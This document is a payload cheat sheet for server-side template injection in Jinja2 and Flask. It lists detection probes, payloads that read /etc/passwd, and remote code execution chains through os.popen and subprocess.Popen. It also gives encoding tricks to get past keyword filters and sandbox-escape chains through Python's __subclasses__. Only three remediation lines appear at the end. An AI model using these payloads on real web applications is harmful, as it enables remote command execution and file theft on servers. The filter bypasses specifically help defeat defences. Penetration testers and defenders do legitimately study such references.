# Jinja2 / Python — Templating Engine (Flask, Django, etc.)

## Summary
Jinja2 is the most common Python template engine, default in Flask.

## Identification
```bash
{{7*7}}       → 49
{{7*'7'}}     → 7777777  (string multiplication — unique to Python)
{{config}}    → Flask config object dump
{{''.__class__.__mro__[1].__subclasses__()}}  → object introspection
```

## Basic Confirmation
```jinja2
{{7*7}}
{{7*'7'}}
{{"7"*7}}
```

## Read Files
```jinja2
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

## RCE

```jinja2
# Using os.popen
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Using subprocess
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Using builtins
{{ lipsum.__globals__["os"].popen('id').read() }}

# Using request object (Flask)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Filter Bypasses

### Common blocks: `class`, `mro`, `subclasses`, `builtins`, `import`, `os`, `popen`

```jinja2
# Hex encoding
{{ ''['\x63\x6c\x61\x73\x73'] }} → ''.__class__

# String concatenation
{{ ''['__cla' + 'ss__'] }}

# Request object access
{{ request['\x5f\x5fclass\x5f\x5f'] }}

# Using |attr filter
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# Join bypass
{{ ''|attr('__c'~'lass__') }}

# Access via dict
{{ dict(__class__=1)|first }}
```

## Sandbox Escapes

```jinja2
# Find subclasses with RCE potential
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Look for <class 'subprocess.Popen'> or <class 'os.wrap_close'>
# Index varies by Python version — iterate to find it
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate()[0] }}
```

## Full RCE Probe
```python
# Python script to find correct subclass index
import re

def find_popen_index():
    for i, cls in enumerate(object.__subclasses__()):
        if 'Popen' in str(cls):
            return i
    return None
```

## Remediation
- Never embed user input directly in templates
- Use Jinja2 sandboxed environment
- Disable `config` and `request` access in template context
